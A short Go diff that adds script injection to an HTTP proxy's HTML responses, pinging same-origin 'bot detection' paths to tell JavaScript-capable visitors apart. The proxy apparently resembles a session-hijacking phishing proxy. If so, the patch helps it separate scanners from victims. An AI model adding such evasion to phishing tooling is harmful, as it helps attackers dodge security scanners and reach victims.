@@ -830,7 +830,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
+        // START: ADD THIS NEW CODE BLOCK
+        if resp.Header.Get("Content-Type" ) == "text/html" {
+            // Inject JavaScript into HTML responses
+            b, err := io.ReadAll(resp.Body)
+            if err != nil {
+                log.Error("failed to read response body: %v", err)
+                return resp
+            }
+            resp.Body.Close()
 
+            // Inject the JavaScript snippet
+            injectedHTML := strings.Replace(string(b), "</body>", "<script>var xhr=new XMLHttpRequest;xhr.open(\"GET\",\"/js_enabled_bot_detection\",!0),xhr.send()</script><noscript><img src=\"/js_disabled_bot_detection\" alt=\"\" width=\"1\" height=\"1\" /></noscript></body>", 1)
+
+            resp.Body = io.NopCloser(strings.NewReader(injectedHTML))
+            resp.Header.Set("Content-Length", strconv.Itoa(len(injectedHTML)))
+        }
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
